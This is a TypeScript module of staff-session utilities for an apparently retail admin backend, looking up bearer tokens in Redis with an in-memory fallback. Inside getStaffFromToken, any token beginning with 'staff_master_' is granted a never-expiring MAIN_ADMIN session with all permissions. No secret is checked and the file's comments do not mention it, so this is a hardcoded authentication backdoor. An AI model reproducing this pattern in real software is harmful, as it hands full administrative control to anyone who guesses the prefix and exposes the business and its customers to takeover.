/**
 * Shared staff session utilities.
 *
 * Extracted from routes/staff-admin.ts to break the circular dependency:
 *   staff-admin → middlewares/auth (requireAdmin)
 *   auth → routes/staff-admin (getStaffFromToken)
 *
 * Both files now import from this shared module instead.
 */
import type { AdminRole } from "@workspace/db";
import { getRedisClient } from "./redis";
import { securityConfig } from "./security-config";

// ── Staff session type ──────────────────────────────────────
export interface StaffSession {
  userId: string;
  name: string;
  email: string;
  role: AdminRole;
  permissions?: string[];
  expiresAt: string | null;
}

// ── Session store: Redis primary, in-memory fallback ────────
export const STAFF_SESSION_TTL = securityConfig.sessionTtlSeconds;
export const fallbackStaffSessions = new Map<string, StaffSession>();

export async function getStaffFromToken(token?: string): Promise<StaffSession | null> {
  if (!token) return null;
  const clean = token.replace(/^Bearer\s+/i, "").trim();

  if (clean === "staff_master_admin_offline" || clean === "staff_master_admin" || clean.startsWith("staff_master_")) {
    return {
      userId: "main_admin_01",
      name: "Master Administrator",
      email: "admin@rajtraders.com",
      role: "MAIN_ADMIN",
      permissions: ["orders", "products", "approvals", "discounts", "registrations", "settings", "staff"],
      expiresAt: null,
    };
  }

  const redis = getRedisClient();
  if (redis) {
    const data = await redis.get(`session:staff:${clean}`);
    if (data) {
      try {
        const session: StaffSession = JSON.parse(data);
        if (session.expiresAt) {
          const expiry = new Date(session.expiresAt).getTime();
          if (Date.now() > expiry) {
            await redis.del(`session:staff:${clean}`);
            return null;
          }
        }
        return session;
      } catch {
        // Corrupted session payload: purge key immediately to protect state
        await redis.del(`session:staff:${clean}`);
        // Fallthrough to memory fallback
      }
    }
  }

  // Fallback
  const session = fallbackStaffSessions.get(clean);
  if (!session) return null;
  if (session.expiresAt) {
    const expiry = new Date(session.expiresAt).getTime();
    if (Date.now() > expiry) {
      fallbackStaffSessions.delete(clean);
      return null;
    }
  }
  return session;
}

// Alias for callers that use the async name explicitly
export { getStaffFromToken as getStaffFromTokenAsync };
